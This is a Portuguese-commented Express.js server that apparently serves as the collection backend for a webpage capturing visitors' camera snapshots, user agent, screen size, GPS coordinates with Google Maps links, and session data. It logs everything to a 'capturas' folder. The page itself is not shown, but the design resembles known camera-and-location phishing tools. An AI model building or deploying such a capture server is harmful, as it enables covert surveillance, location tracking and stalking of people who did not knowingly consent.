const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Configura o Express para ler dados JSON
app.use(express.json({ limit: '10mb' }));

// Serve arquivos estáticos (se você tiver imagens, CSS, etc. em uma pasta 'public')
// app.use(express.static('public'));

// ROTA PRINCIPAL: Serve a interface.html quando acessar a raiz (/)
app.get('/', (req, res) => {
    const htmlPath = path.join(__dirname, 'interface.html');
    res.sendFile(htmlPath);
});

// Cria a pasta de capturas se não existir
const captureDir = path.join(__dirname, 'capturas');
if (!fs.existsSync(captureDir)) {
    fs.mkdirSync(captureDir, { recursive: true });
}

// Endpoint para capturas de câmera
app.post('/api/captura', (req, res) => {
    const { timestamp, facingMode, image, userAgent, screenRes } = req.body;
    
    if (!image) return res.status(400).json({ error: 'Imagem ausente' });

    const base64Data = image.split(',')[1];
    const binaryData = Buffer.from(base64Data, 'base64');
    
    // Nomeia o arquivo com timestamp e modo da câmera
    const fileName = `cap_${timestamp.replace(/[:.]/g, '-')}_${facingMode}.jpg`;
    const filePath = path.join(captureDir, fileName);
    
    fs.writeFileSync(filePath, binaryData);
    
    // Loga os metadados
    const logEntry = {
        timestamp,
        facingMode,
        userAgent,
        screenRes,
        file: fileName
    };
    
    // Adiciona ao arquivo de log
    fs.appendFileSync('capturas/log.json', JSON.stringify(logEntry) + '\n');
    
    console.log(`Nova captura: ${fileName} | ${facingMode} | ${userAgent}`);
    res.status(200).json({ success: true });
});

// Endpoint para geolocalização
app.post('/api/geolocalizacao', (req, res) => {
    const { lat, lon, accuracy } = req.body;
    const geoLog = {
        timestamp: new Date().toISOString(),
        lat,
        lon,
        accuracy,
        url: `https://www.google.com/maps?q=${lat},${lon}`
    };
    fs.appendFileSync('capturas/geo_log.json', JSON.stringify(geoLog) + '\n');
    console.log(`Geolocalização: ${lat}, ${lon} | Link: ${geoLog.url}`);
    res.status(200).json({ success: true });
});

// Endpoint para sessão final
app.post('/api/sessao_final', (req, res) => {
    const sessionData = req.body;
    fs.appendFileSync('capturas/sessoes.json', JSON.stringify(sessionData) + '\n');
    res.status(200).json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});